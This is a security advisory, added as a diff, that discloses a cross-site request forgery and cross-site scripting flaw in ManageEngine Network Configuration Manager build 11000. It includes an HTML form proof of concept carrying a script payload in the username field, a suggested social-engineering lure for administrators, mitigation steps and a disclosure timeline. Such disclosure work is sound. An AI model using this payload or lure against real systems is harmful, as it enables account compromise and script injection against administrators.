@@ -1,0 +1,94 @@
+=========================================================================================
+Cross-Site Request Forgery Vulnerability in ManageEngine Network Configuration Management
+=========================================================================================
+
+.. contents:: Table Of Content
+
+Overview
+========
+Title:- Cross-Site Request Forgery (CSRF) Vulnerability in ManageEngine Network Configuration Management
+Author: Kaustubh G. Padwad
+Vendor: ZOHO Corp
+Product: ManageEngine Network Configuration Manager 
+Tested Version: : Network Configuration Manager Build 11000
+Severity: HIGH
+
+Advisory ID
+============
+2016-02-Manage_Engine
+
+
+About the Product:
+==================
+
+Network Configuration Manager is a web–based, multi vendor network change, configuration and compliance management (NCCCM) solution for switches, routers, firewalls and other network devices. Trusted by thousands of network administrators around the world, Network Configuration Manager helps automate and take total control of the entire life cycle of device configuration management.
+
+Description: 
+============
+
+This Cross-Site Request Forgery vulnerability enables an anonymous attacker to add an device into the application. and device fileds are vulnerable tocross site scripting attack This leads to compromising the whole domain as the application. 
+
+Vulnerability Class:
+====================
+
+Cross-Site Request Forgery (CSRF) - https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29
+
+How to Reproduce: (POC):
+========================
+
+* Add follwing code to webserver and send that malicious link to application Admin.
+
+* No Login Required as this is on logon Page
+
+( Soical enginering might help here 
+
+* For Example :- Device password has been changed click here to reset
+
+CSRF COde
+=========
+<html>
+
+  <body>
+
+    <form action="http://192.168.1.10:8080/netflow/jspui/j_security_check">
+
+      <input type="hidden" name="radiusUserEnabled" value="false" />
+
+      <input type="hidden" name="AUTHRULE&#95;NAME" value="Authenticator" />
+
+      <input type="hidden" name="j&#95;username" value="admin52f43&apos;><script>alert&#40;1&#41;<&#47;script>6f472a19875" />
+
+      <input type="hidden" name="j&#95;password" value="admin" />
+
+      <input type="submit" value="Submit request" />
+
+    </form>
+
+  </body>
+
+</html>
+
+
+
+
+Mitigation
+==========
+1. Download the security.xml from here https://drive.google.com/file/d/0B6Vlr2bSsrysR3N1cE82NUNJV28/view?usp=sharing
+2. Stop the NCM service.
+3. Replace the attached security.xml under NCM_Home/webapps/netflow/WEB-INF.
+4. Start the NCM service and test for the Vulnerability
+
+
+Disclosure: 
+===========
+28-JAN-2016 Repoerted to vendor
+29-JAN-2016 Fixed By Vendor
+
+#credits:
+Kaustubh Padwad
+Information Security Researcher
+kingkaustubh@me.com
+https://twitter.com/s3curityb3ast
+http://breakthesec.com
+https://www.linkedin.com/in/kaustubhpadwad
+
